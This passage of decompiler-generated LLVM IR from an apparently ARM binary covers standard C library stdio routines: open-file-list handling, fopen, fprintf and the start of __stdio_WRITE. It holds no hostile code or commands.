  br i1 %v0_1b414, label %dec_label_pc_1b418, label %dec_label_pc_1b404.dec_label_pc_1b3f8_crit_edge

dec_label_pc_1b404.dec_label_pc_1b3f8_crit_edge:  ; preds = %dec_label_pc_1b404
  %v0_1b3f8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1b3fc.pre = load i32, i32* @r4, align 4
  %v1_1b3f8 = inttoptr i32 %v0_1b3f8.pre to i32*
  %v2_1b3f8 = load i32, i32* %v1_1b3f8, align 4
  store i32 %v2_1b3f8, i32* %r3.global-to-local, align 4
  %v3_1b3fc = icmp uge i32 %v2_1b3f8, %v1_1b3fc.pre
  store i1 %v3_1b3fc, i1* %cpsr_c.global-to-local, align 1
  %v9_1b3fc = icmp eq i32 %v2_1b3f8, %v1_1b3fc.pre
  br i1 %v9_1b3fc, label %dec_label_pc_1b404, label %dec_label_pc_1b41c

dec_label_pc_1b418:                               ; preds = %dec_label_pc_1b404
  %v0_1b418 = load i32, i32* @r4, align 4
  store i32 %v0_1b418, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1b41c

dec_label_pc_1b41c:                               ; preds = %dec_label_pc_1b3ec, %dec_label_pc_1b404.dec_label_pc_1b3f8_crit_edge, %dec_label_pc_1b418
  %v0_1b424 = phi i32 [ %v0_1b418, %dec_label_pc_1b418 ], [ %v2_1b3f896, %dec_label_pc_1b3ec ], [ %v2_1b3f8, %dec_label_pc_1b404.dec_label_pc_1b3f8_crit_edge ]
  %v1_1b41c = phi i32 [ %v0_1b418, %dec_label_pc_1b418 ], [ %v2_1b3ec, %dec_label_pc_1b3ec ], [ %v1_1b3fc.pre, %dec_label_pc_1b404.dec_label_pc_1b3f8_crit_edge ]
  %v3_1b41c = icmp uge i32 %v0_1b424, %v1_1b41c
  store i1 %v3_1b41c, i1* %cpsr_c.global-to-local, align 1
  %v9_1b41c = icmp eq i32 %v0_1b424, %v1_1b41c
  br i1 %v9_1b41c, label %dec_label_pc_1b424, label %dec_label_pc_1b41c.dec_label_pc_1b3ec_crit_edge

dec_label_pc_1b41c.dec_label_pc_1b3ec_crit_edge:  ; preds = %dec_label_pc_1b41c
  %v0_1b3ec.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1b3ec

dec_label_pc_1b424:                               ; preds = %dec_label_pc_1b41c
  %v2_1b424 = icmp ne i32 %v1_1b41c, 0
  store i1 %v2_1b424, i1* %cpsr_c.global-to-local, align 1
  %v7_1b428 = icmp slt i32 %v1_1b41c, 2
  br i1 %v7_1b428, label %dec_label_pc_1b444, label %dec_label_pc_1b42c

dec_label_pc_1b42c:                               ; preds = %dec_label_pc_1b424
  %v0_1b42c = load i32, i32* @r7, align 4
  store i32 %v0_1b42c, i32* %r0.global-to-local, align 4
  %v0_1b430 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b430 = add i32 %v0_1b430, 129
  store i32 %v1_1b430, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1b444

dec_label_pc_1b444:                               ; preds = %dec_label_pc_1b3bc, %dec_label_pc_1b42c, %dec_label_pc_1b424
  %v0_1b444 = load i32, i32* @r5, align 4
  %v1_1b444 = inttoptr i32 %v0_1b444 to i16*
  %v2_1b444 = load i16, i16* %v1_1b444, align 2
  %v3_1b444 = zext i16 %v2_1b444 to i32
  %v1_1b448 = and i32 %v3_1b444, 24576
  %v1_1b44c = or i32 %v1_1b448, 48
  store i32 %v1_1b44c, i32* %r3.global-to-local, align 4
  %v0_1b450 = load i32, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1b450 = icmp eq i32 %v0_1b450, 0
  %v1_1b454 = trunc i32 %v1_1b44c to i16
  store i16 %v1_1b454, i16* %v1_1b444, align 2
  br i1 %v2_1b450, label %dec_label_pc_1b45c, label %dec_label_pc_1b4d0

dec_label_pc_1b45c:                               ; preds = %dec_label_pc_1b444
  %v0_1b45c = load i32, i32* @r5, align 4
  %v1_1b45c = add i32 %v0_1b45c, 60
  %v2_1b45c = inttoptr i32 %v1_1b45c to i32*
  %v3_1b45c = load i32, i32* %v2_1b45c, align 4
  %v1_1b460 = add i32 %v3_1b45c, -1
  store i32 %v1_1b460, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1b464 = icmp eq i32 %v1_1b460, 0
  store i32 %v1_1b460, i32* %v2_1b45c, align 4
  br i1 %v2_1b464, label %dec_label_pc_1b470, label %dec_label_pc_1b4d0

dec_label_pc_1b470:                               ; preds = %dec_label_pc_1b45c
  %v0_1b470 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b470 = load i32, i32* @r5, align 4
  %v2_1b470 = add i32 %v1_1b470, 64
  %v3_1b470 = inttoptr i32 %v2_1b470 to i32*
  store i32 %v0_1b470, i32* %v3_1b470, align 4
  %v0_1b474 = load i32, i32* @r5, align 4
  %v1_1b474 = add i32 %v0_1b474, 56
  store i32 %v1_1b474, i32* @r6, align 4
  br label %dec_label_pc_1b478

dec_label_pc_1b478:                               ; preds = %dec_label_pc_1b4a8.dec_label_pc_1b478_crit_edge, %dec_label_pc_1b470
  %v0_1b480 = phi i32 [ %v0_1b480.pre, %dec_label_pc_1b4a8.dec_label_pc_1b478_crit_edge ], [ %v1_1b474, %dec_label_pc_1b470 ]
  %v0_1b478 = phi i32 [ %v0_1b478.pre, %dec_label_pc_1b4a8.dec_label_pc_1b478_crit_edge ], [ %v0_1b474, %dec_label_pc_1b470 ]
  %v1_1b478 = add i32 %v0_1b478, 56
  %v2_1b478 = inttoptr i32 %v1_1b478 to i32*
  %v3_1b478 = load i32, i32* %v2_1b478, align 4
  store i32 %v3_1b478, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_1b480, i32* %r2.global-to-local, align 4
  %v1_1b48482 = inttoptr i32 %v0_1b480 to i32*
  %v2_1b48483 = load i32, i32* %v1_1b48482, align 4
  store i32 %v2_1b48483, i32* %r3.global-to-local, align 4
  %v3_1b48885 = icmp uge i32 %v2_1b48483, %v3_1b478
  store i1 %v3_1b48885, i1* %cpsr_c.global-to-local, align 1
  %v9_1b48891 = icmp eq i32 %v2_1b48483, %v3_1b478
  br i1 %v9_1b48891, label %dec_label_pc_1b490, label %dec_label_pc_1b4a8

dec_label_pc_1b490:                               ; preds = %dec_label_pc_1b478, %dec_label_pc_1b490.dec_label_pc_1b484_crit_edge
  %v0_1b49092 = phi i32 [ %v1_1b488.pre, %dec_label_pc_1b490.dec_label_pc_1b484_crit_edge ], [ %v3_1b478, %dec_label_pc_1b478 ]
  store i32 %v0_1b49092, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1b4a0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1b4a0, label %dec_label_pc_1b4a4, label %dec_label_pc_1b490.dec_label_pc_1b484_crit_edge

dec_label_pc_1b490.dec_label_pc_1b484_crit_edge:  ; preds = %dec_label_pc_1b490
  %v0_1b484.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1b488.pre = load i32, i32* @r4, align 4
  %v1_1b484 = inttoptr i32 %v0_1b484.pre to i32*
  %v2_1b484 = load i32, i32* %v1_1b484, align 4
  store i32 %v2_1b484, i32* %r3.global-to-local, align 4
  %v3_1b488 = icmp uge i32 %v2_1b484, %v1_1b488.pre
  store i1 %v3_1b488, i1* %cpsr_c.global-to-local, align 1
  %v9_1b488 = icmp eq i32 %v2_1b484, %v1_1b488.pre
  br i1 %v9_1b488, label %dec_label_pc_1b490, label %dec_label_pc_1b4a8

dec_label_pc_1b4a4:                               ; preds = %dec_label_pc_1b490
  %v0_1b4a4 = load i32, i32* @r4, align 4
  store i32 %v0_1b4a4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1b4a8

dec_label_pc_1b4a8:                               ; preds = %dec_label_pc_1b478, %dec_label_pc_1b490.dec_label_pc_1b484_crit_edge, %dec_label_pc_1b4a4
  %v0_1b4b0 = phi i32 [ %v0_1b4a4, %dec_label_pc_1b4a4 ], [ %v2_1b48483, %dec_label_pc_1b478 ], [ %v2_1b484, %dec_label_pc_1b490.dec_label_pc_1b484_crit_edge ]
  %v1_1b4a8 = phi i32 [ %v0_1b4a4, %dec_label_pc_1b4a4 ], [ %v3_1b478, %dec_label_pc_1b478 ], [ %v1_1b488.pre, %dec_label_pc_1b490.dec_label_pc_1b484_crit_edge ]
  %v3_1b4a8 = icmp uge i32 %v0_1b4b0, %v1_1b4a8
  store i1 %v3_1b4a8, i1* %cpsr_c.global-to-local, align 1
  %v9_1b4a8 = icmp eq i32 %v0_1b4b0, %v1_1b4a8
  br i1 %v9_1b4a8, label %dec_label_pc_1b4b0, label %dec_label_pc_1b4a8.dec_label_pc_1b478_crit_edge

dec_label_pc_1b4a8.dec_label_pc_1b478_crit_edge:  ; preds = %dec_label_pc_1b4a8
  %v0_1b478.pre = load i32, i32* @r5, align 4
  %v0_1b480.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1b478

dec_label_pc_1b4b0:                               ; preds = %dec_label_pc_1b4a8
  %v2_1b4b0 = icmp ne i32 %v1_1b4a8, 0
  store i1 %v2_1b4b0, i1* %cpsr_c.global-to-local, align 1
  %v7_1b4b4 = icmp slt i32 %v1_1b4a8, 2
  br i1 %v7_1b4b4, label %dec_label_pc_1b4d0, label %dec_label_pc_1b4b8

dec_label_pc_1b4b8:                               ; preds = %dec_label_pc_1b4b0
  %v0_1b4b8 = load i32, i32* @r5, align 4
  %v1_1b4b8 = add i32 %v0_1b4b8, 56
  store i32 %v1_1b4b8, i32* %r0.global-to-local, align 4
  %v0_1b4bc = load i32, i32* %r1.global-to-local, align 4
  %v1_1b4bc = add i32 %v0_1b4bc, 129
  store i32 %v1_1b4bc, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1b4d0

dec_label_pc_1b4d0:                               ; preds = %dec_label_pc_1b45c, %dec_label_pc_1b444, %dec_label_pc_1b4b8, %dec_label_pc_1b4b0
  %v0_1b4d0 = load i32, i32* @r5, align 4
  %v1_1b4d0 = inttoptr i32 %v0_1b4d0 to i16*
  %v2_1b4d0 = load i16, i16* %v1_1b4d0, align 2
  %v3_1b4d0 = zext i16 %v2_1b4d0 to i32
  store i32 %v3_1b4d0, i32* %r3.global-to-local, align 4
  %v1_1b4d4 = and i32 %v3_1b4d0, 16384
  %v2_1b4d4 = icmp eq i32 %v1_1b4d4, 0
  br i1 %v2_1b4d4, label %bb49, label %bb48

bb48:                                             ; preds = %dec_label_pc_1b4d0
  %v2_1b4d8 = add i32 %v0_1b4d0, 8
  %v3_1b4d8 = inttoptr i32 %v2_1b4d8 to i32*
  %v4_1b4d8 = load i32, i32* %v3_1b4d8, align 4
  store i32 %v4_1b4d8, i32* %r0.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_1b4d0, %bb48
  %v1_1b4dc = xor i1 %v2_1b4d4, true
  call void @__pseudo_cond_branch(i1 %v1_1b4dc, i32 ptrtoint (i32* @global_var_17778.1695 to i32))
  store i32 176, i32* %r3.global-to-local, align 4
  %v0_1b4e4 = load i32, i32* @r8, align 4
  %v2_1b4e4 = add i32 %v0_1b4e4, 176
  %v3_1b4e4 = inttoptr i32 %v2_1b4e4 to i32*
  %v4_1b4e4 = load i32, i32* %v3_1b4e4, align 4
  store i32 %v4_1b4e4, i32* @r5, align 4
  %v1_1b4e8 = add i32 %v4_1b4e4, 8
  %v2_1b4e8 = inttoptr i32 %v1_1b4e8 to i32*
  %v3_1b4e8 = load i32, i32* %v2_1b4e8, align 4
  store i32 %v3_1b4e8, i32* %r3.global-to-local, align 4
  %v1_1b4ec = load i32, i32* %sl.global-to-local, align 4
  %v3_1b4ec = icmp uge i32 %v3_1b4e8, %v1_1b4ec
  store i1 %v3_1b4ec, i1* %cpsr_c.global-to-local, align 1
  %v9_1b4ec = icmp eq i32 %v3_1b4e8, %v1_1b4ec
  br i1 %v9_1b4ec, label %dec_label_pc_1b534, label %dec_label_pc_1b4f4

dec_label_pc_1b4f4:                               ; preds = %bb49
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_1b4e4, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1b50075 = inttoptr i32 %v4_1b4e4 to i32*
  %v2_1b50076 = load i32, i32* %v1_1b50075, align 4
  store i32 %v2_1b50076, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1b50478 = icmp eq i32 %v2_1b50076, 0
  br i1 %v9_1b50478, label %dec_label_pc_1b50c, label %dec_label_pc_1b524

dec_label_pc_1b50c:                               ; preds = %dec_label_pc_1b4f4, %dec_label_pc_1b50c.dec_label_pc_1b500_crit_edge
  %v0_1b50c79 = phi i32 [ %v1_1b504.pre, %dec_label_pc_1b50c.dec_label_pc_1b500_crit_edge ], [ 0, %dec_label_pc_1b4f4 ]
  store i32 %v0_1b50c79, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1b51c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1b51c, label %dec_label_pc_1b520, label %dec_label_pc_1b50c.dec_label_pc_1b500_crit_edge

dec_label_pc_1b50c.dec_label_pc_1b500_crit_edge:  ; preds = %dec_label_pc_1b50c
  %v0_1b500.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1b504.pre = load i32, i32* @r4, align 4
  %v1_1b500 = inttoptr i32 %v0_1b500.pre to i32*
  %v2_1b500 = load i32, i32* %v1_1b500, align 4
  store i32 %v2_1b500, i32* %r3.global-to-local, align 4
  %v3_1b504 = icmp uge i32 %v2_1b500, %v1_1b504.pre
  store i1 %v3_1b504, i1* %cpsr_c.global-to-local, align 1
  %v9_1b504 = icmp eq i32 %v2_1b500, %v1_1b504.pre
  br i1 %v9_1b504, label %dec_label_pc_1b50c, label %dec_label_pc_1b524

dec_label_pc_1b520:                               ; preds = %dec_label_pc_1b50c
  %v0_1b520 = load i32, i32* @r4, align 4
  store i32 %v0_1b520, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1b524

dec_label_pc_1b524:                               ; preds = %dec_label_pc_1b4f4, %dec_label_pc_1b50c.dec_label_pc_1b500_crit_edge, %dec_label_pc_1b520
  %v0_1b524 = phi i32 [ %v0_1b520, %dec_label_pc_1b520 ], [ %v2_1b50076, %dec_label_pc_1b4f4 ], [ %v2_1b500, %dec_label_pc_1b50c.dec_label_pc_1b500_crit_edge ]
  %v1_1b524 = phi i32 [ %v0_1b520, %dec_label_pc_1b520 ], [ 0, %dec_label_pc_1b4f4 ], [ %v1_1b504.pre, %dec_label_pc_1b50c.dec_label_pc_1b500_crit_edge ]
  %v3_1b524 = icmp uge i32 %v0_1b524, %v1_1b524
  store i1 %v3_1b524, i1* %cpsr_c.global-to-local, align 1
  %v9_1b524 = icmp eq i32 %v0_1b524, %v1_1b524
  br i1 %v9_1b524, label %bb51, label %bb50

bb50:                                             ; preds = %dec_label_pc_1b524
  %v1_1b528 = load i32, i32* @r5, align 4
  store i32 %v1_1b528, i32* %r0.global-to-local, align 4
  br label %bb51

bb51:                                             ; preds = %dec_label_pc_1b524, %bb50
  %v1_1b52c = xor i1 %v9_1b524, true
  call void @__pseudo_cond_branch(i1 %v1_1b52c, i32 ptrtoint (i32* @global_var_1907c.1373 to i32))
  %v0_1b530 = load i32, i32* %sl.global-to-local, align 4
  %v1_1b530 = load i32, i32* @r5, align 4
  %v2_1b530 = add i32 %v1_1b530, 8
  %v3_1b530 = inttoptr i32 %v2_1b530 to i32*
  store i32 %v0_1b530, i32* %v3_1b530, align 4
  %v0_1b538.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1b534

dec_label_pc_1b534:                               ; preds = %bb49, %bb51
  %v0_1b538 = phi i32 [ %v0_1b4e4, %bb49 ], [ %v0_1b538.pre, %bb51 ]
  store i32 92, i32* %r3.global-to-local, align 4
  %v2_1b538 = add i32 %v0_1b538, 92
  %v3_1b538 = inttoptr i32 %v2_1b538 to i32*
  %v4_1b538 = load i32, i32* %v3_1b538, align 4
  store i32 %v4_1b538, i32* %r2.global-to-local, align 4
  store i32 176, i32* %r3.global-to-local, align 4
  %v2_1b540 = add i32 %v0_1b538, 176
  %v3_1b540 = inttoptr i32 %v2_1b540 to i32*
  %v4_1b540 = load i32, i32* %v3_1b540, align 4
  store i32 %v4_1b540, i32* %r0.global-to-local, align 4
  %v1_1b544 = inttoptr i32 %v4_1b538 to i32*
  %v2_1b544 = load i32, i32* %v1_1b544, align 4
  store i32 %v2_1b544, i32* %r3.global-to-local, align 4
  %v1_1b548 = add i32 %v4_1b540, 4
  %v2_1b548 = inttoptr i32 %v1_1b548 to i32*
  %v3_1b548 = load i32, i32* %v2_1b548, align 4
  store i32 %v3_1b548, i32* %r1.global-to-local, align 4
  %v1_1b54c = add i32 %v2_1b544, 1
  store i32 %v1_1b54c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1b550 = icmp eq i32 %v3_1b548, 0
  store i32 %v1_1b54c, i32* %v1_1b544, align 4
  br i1 %v2_1b550, label %dec_label_pc_1b55c, label %dec_label_pc_1b5bc

dec_label_pc_1b55c:                               ; preds = %dec_label_pc_1b534
  %v0_1b55c = load i32, i32* %r1.global-to-local, align 4
  %v1_1b55c = load i32, i32* %r0.global-to-local, align 4
  %v2_1b55c = add i32 %v1_1b55c, 8
  %v3_1b55c = inttoptr i32 %v2_1b55c to i32*
  store i32 %v0_1b55c, i32* %v3_1b55c, align 4
  %v0_1b560 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1b560, i32* @r5, align 4
  br label %dec_label_pc_1b564

dec_label_pc_1b564:                               ; preds = %dec_label_pc_1b594.dec_label_pc_1b564_crit_edge, %dec_label_pc_1b55c
  %v0_1b564 = phi i32 [ %v0_1b564.pre, %dec_label_pc_1b594.dec_label_pc_1b564_crit_edge ], [ %v0_1b560, %dec_label_pc_1b55c ]
  %v1_1b564 = inttoptr i32 %v0_1b564 to i32*
  %v2_1b564 = load i32, i32* %v1_1b564, align 4
  store i32 %v2_1b564, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_1b564, i32* %r2.global-to-local, align 4
  %v2_1b57064 = load i32, i32* %v1_1b564, align 4
  store i32 %v2_1b57064, i32* %r3.global-to-local, align 4
  %v3_1b57466 = icmp uge i32 %v2_1b57064, %v2_1b564
  store i1 %v3_1b57466, i1* %cpsr_c.global-to-local, align 1
  %v9_1b57472 = icmp eq i32 %v2_1b57064, %v2_1b564
  br i1 %v9_1b57472, label %dec_label_pc_1b57c, label %dec_label_pc_1b594

dec_label_pc_1b57c:                               ; preds = %dec_label_pc_1b564, %dec_label_pc_1b57c.dec_label_pc_1b570_crit_edge
  %v0_1b57c73 = phi i32 [ %v1_1b574.pre, %dec_label_pc_1b57c.dec_label_pc_1b570_crit_edge ], [ %v2_1b564, %dec_label_pc_1b564 ]
  store i32 %v0_1b57c73, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1b58c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1b58c, label %dec_label_pc_1b590, label %dec_label_pc_1b57c.dec_label_pc_1b570_crit_edge

dec_label_pc_1b57c.dec_label_pc_1b570_crit_edge:  ; preds = %dec_label_pc_1b57c
  %v0_1b570.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1b574.pre = load i32, i32* @r4, align 4
  %v1_1b570 = inttoptr i32 %v0_1b570.pre to i32*
  %v2_1b570 = load i32, i32* %v1_1b570, align 4
  store i32 %v2_1b570, i32* %r3.global-to-local, align 4
  %v3_1b574 = icmp uge i32 %v2_1b570, %v1_1b574.pre
  store i1 %v3_1b574, i1* %cpsr_c.global-to-local, align 1
  %v9_1b574 = icmp eq i32 %v2_1b570, %v1_1b574.pre
  br i1 %v9_1b574, label %dec_label_pc_1b57c, label %dec_label_pc_1b594

dec_label_pc_1b590:                               ; preds = %dec_label_pc_1b57c
  %v0_1b590 = load i32, i32* @r4, align 4
  store i32 %v0_1b590, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1b594

dec_label_pc_1b594:                               ; preds = %dec_label_pc_1b564, %dec_label_pc_1b57c.dec_label_pc_1b570_crit_edge, %dec_label_pc_1b590
  %v0_1b59c = phi i32 [ %v0_1b590, %dec_label_pc_1b590 ], [ %v2_1b57064, %dec_label_pc_1b564 ], [ %v2_1b570, %dec_label_pc_1b57c.dec_label_pc_1b570_crit_edge ]
  %v1_1b594 = phi i32 [ %v0_1b590, %dec_label_pc_1b590 ], [ %v2_1b564, %dec_label_pc_1b564 ], [ %v1_1b574.pre, %dec_label_pc_1b57c.dec_label_pc_1b570_crit_edge ]
  %v3_1b594 = icmp uge i32 %v0_1b59c, %v1_1b594
  store i1 %v3_1b594, i1* %cpsr_c.global-to-local, align 1
  %v9_1b594 = icmp eq i32 %v0_1b59c, %v1_1b594
  br i1 %v9_1b594, label %dec_label_pc_1b59c, label %dec_label_pc_1b594.dec_label_pc_1b564_crit_edge

dec_label_pc_1b594.dec_label_pc_1b564_crit_edge:  ; preds = %dec_label_pc_1b594
  %v0_1b564.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1b564

dec_label_pc_1b59c:                               ; preds = %dec_label_pc_1b594
  %v2_1b59c = icmp ne i32 %v1_1b594, 0
  store i1 %v2_1b59c, i1* %cpsr_c.global-to-local, align 1
  %v7_1b5a0 = icmp slt i32 %v1_1b594, 2
  br i1 %v7_1b5a0, label %dec_label_pc_1b5bc, label %dec_label_pc_1b5a4

dec_label_pc_1b5a4:                               ; preds = %dec_label_pc_1b59c
  %v0_1b5a4 = load i32, i32* @r5, align 4
  store i32 %v0_1b5a4, i32* %r0.global-to-local, align 4
  %v0_1b5a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b5a8 = add i32 %v0_1b5a8, 129
  store i32 %v1_1b5a8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1b5bc

dec_label_pc_1b5bc:                               ; preds = %dec_label_pc_1b534, %dec_label_pc_1b5a4, %dec_label_pc_1b59c
  %v0_1b5bc = call i32 @_stdio_openlist_dec_use()
  %v0_1b5c0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1b5c0, i32* %r0.global-to-local, align 4
  %v2_1b5c8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1b5c8, i32* @r4, align 4
  store i32 %v6_1b2b0, i32* @r5, align 4
  store i32 %v9_1b2b0, i32* @r6, align 4
  store i32 %v12_1b2b0, i32* @r7, align 4
  store i32 %v15_1b2b0, i32* @r8, align 4
  store i32 %v27_1b2b0, i32* @lr, align 4
  ret i32 %v0_1b5c0

; uselistorder directives
  uselistorder i32 %v0_1b590, { 1, 0, 2 }
  uselistorder i32 %v1_1b574.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1b564, { 1, 0 }
  uselistorder i32 %v0_1b538, { 1, 0 }
  uselistorder i32 %v0_1b520, { 1, 0, 2 }
  uselistorder i32 %v1_1b504.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1b4ec, { 1, 0 }
  uselistorder i32 %v0_1b4a4, { 1, 0, 2 }
  uselistorder i32 %v1_1b488.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1b418, { 1, 0, 2 }
  uselistorder i32 %v1_1b3fc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1b3ec, { 1, 0 }
  uselistorder i32 %v0_1b3a8, { 1, 0, 2 }
  uselistorder i32 %v1_1b38c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1b36c, { 1, 0 }
  uselistorder i32 %v1_1b2f8.pre, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 41, 4, 5, 6, 7, 8, 10, 9, 42, 11, 14, 12, 13, 15, 17, 16, 43, 18, 19, 20, 21, 22, 24, 23, 44, 25, 26, 27, 28, 30, 29, 45, 31, 32, 33, 34, 35, 36, 37, 39, 38, 46, 40 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 25, 21, 22, 0, 23, 24, 26, 1 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 24, 25, 3, 4, 5, 26, 27, 6, 7, 8, 9, 28, 29, 10, 11, 12, 13, 14, 30, 31, 15, 16, 17, 32, 33, 18, 19, 20, 21, 34, 35, 22, 23 }
  uselistorder label %dec_label_pc_1b5bc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1b594, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1b57c, { 1, 0 }
  uselistorder label %dec_label_pc_1b534, { 1, 0 }
  uselistorder label %bb51, { 1, 0 }
  uselistorder label %dec_label_pc_1b524, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1b50c, { 1, 0 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %dec_label_pc_1b4d0, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1b4a8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1b490, { 1, 0 }
  uselistorder label %dec_label_pc_1b444, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1b41c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1b404, { 1, 0 }
  uselistorder label %dec_label_pc_1b3bc, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_1b3ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1b394, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_1b334, { 1, 0 }
  uselistorder label %dec_label_pc_1b328, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_1b318, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1b300, { 1, 0 }
}

define i32 @function_1b5d4(i16* %arg1) local_unnamed_addr {
dec_label_pc_1b5d4:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_1b5d4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1b5d4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1b5d4
  %v2_1b5d4 = trunc i32 %tmp to i16
  store i16 %v2_1b5d4, i16* %arg1, align 2
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1b5d4, %bb
  %v10_1b5dc = phi i32 [ %tmp, %dec_label_pc_1b5d4 ], [ 0, %bb ]
  ret i32 %v10_1b5dc

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_1b5f0 = call i32 @_stdio_fopen()
  ret i32 %v0_1b5f0
}

define i32 @fprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_1b60c = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_1b60c, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_1b61c = call i32 @__GI_vfprintf()
  ret i32 %v0_1b61c

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %v15_1b630 = load i32, i32* @r8, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 2147483647, i32* @r8, align 4
  %v2_1b6f42 = icmp eq i32 %arg3, 0
  store i1 %v2_1b6f42, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b6f42, label %dec_label_pc_1b6fc, label %dec_label_pc_1b64c

dec_label_pc_1b64c:                               ; preds = %entry, %dec_label_pc_1b6f4thread-pre-split.dec_label_pc_1b64c_crit_edge
  %v0_1b658 = phi i32 [ %v0_1b658.pre, %dec_label_pc_1b6f4thread-pre-split.dec_label_pc_1b64c_crit_edge ], [ %tmp, %entry ]
  %v0_1b654 = phi i32 [ %v5_1b664, %dec_label_pc_1b6f4thread-pre-split.dec_label_pc_1b64c_crit_edge ], [ %arg2, %entry ]
  %v3_1b64c = phi i32 [ %v3_1b64c.pre, %dec_label_pc_1b6f4thread-pre-split.dec_label_pc_1b64c_crit_edge ], [ 2147483647, %entry ]
